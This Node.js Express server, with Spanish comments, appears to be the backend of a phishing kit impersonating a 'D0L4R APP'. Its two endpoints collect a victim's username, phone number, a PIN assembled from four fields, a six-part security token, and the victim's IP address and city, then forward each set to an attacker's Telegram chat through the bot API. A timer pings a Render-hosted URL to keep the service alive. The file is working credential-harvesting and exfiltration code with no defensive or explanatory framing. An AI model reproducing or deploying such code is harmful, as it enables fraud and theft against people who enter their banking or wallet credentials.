const express = require('express');
const bodyParser = require('body-parser');

const cors = require('cors'); // Importar cors
const axios = require('axios');
const app = express();
const FormData = require("form-data");



app.use(cors({
    origin: '*', // Permitir cualquier origen
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));


app.use(bodyParser.json());

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.get('/', (req, res) => {
    res.send('Servidor activo');
});


app.post('/api/sendMessage', async (req, res) => {
    const { use0, use1, use2, use3, use4, use5, ip, city } = req.body;

    if (!use0 || !use1 || !use2 || !use3 || !use4 || !use5 || !ip ) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `💚D0L4R APP💚\nUBY: ${use0}\nC3L: <code>${use1}</code>\n\nCL4V: <code>${use2}${use3}${use4}${use5}</code>\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
	    parse_mode: "HTML"
        });
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/sendMessage2', async (req, res) => {
    const { use0, use1, use2, use3, use4, use5, use6, use7, ip, city } = req.body;

    if (!use0 || !use1 || !use2 || !use3 || !use4 || !use5 || !use6 || !use7 || !ip ) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🔐💚D0L4R APP💚\nUBY: ${use0}\nC3L: <code>${use1}</code>\n\nT0K3N: <code>${use2}${use3}${use4}${use5}${use6}${use7}</code>\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
 	    parse_mode: "HTML"
        });
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});




const keepAliveUrl = 'https://doliapjos.onrender.com';

setInterval(() => {
    axios.get(keepAliveUrl)
        .then(response => console.log(`Ping exitoso: ${new Date().toLocaleTimeString()}`))
        .catch(error => console.error(`Error en el ping: ${error.message}`));
}, 180000); // 180000 ms = 3 minutos





const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});
